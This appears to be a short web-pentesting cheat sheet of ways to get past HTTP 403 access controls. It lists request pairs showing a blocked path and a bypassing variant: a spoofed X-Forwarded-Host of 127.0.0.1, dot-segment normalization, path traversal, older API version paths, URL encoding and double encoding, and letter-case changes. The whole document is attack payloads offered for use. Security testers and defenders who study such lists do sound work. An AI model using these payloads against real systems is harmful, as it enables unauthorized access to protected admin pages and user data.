### Adding X-Forwarded-Host Header
```
X-Forwarded-Host: 127.0.0.1 >> 200 OK
```
### Exploiting Path Normalization
```
/secure/admin >> 403 Access Denied
/secure/./admin >> 200 OK
```
### Path traversal
```
/admin >> 403 Access Denied
/secure/../admin >> 200 OK
```
### api version changing
```
/v2/users/1337 >> Access Denied
/v1/users/1337 >> 200 OK
/v1.1/users/1337 >> 200 OK
```
### HTML encoding
```
/hidden >> 403 Access Denied
/hidde%6e >> 200 OK
```
If it not works, try double encoding.
```
/hidde%256e > 200 OK
```
### Case changing
```
/admin >> 403 Access Denied
/admiN >> 200 OK
```
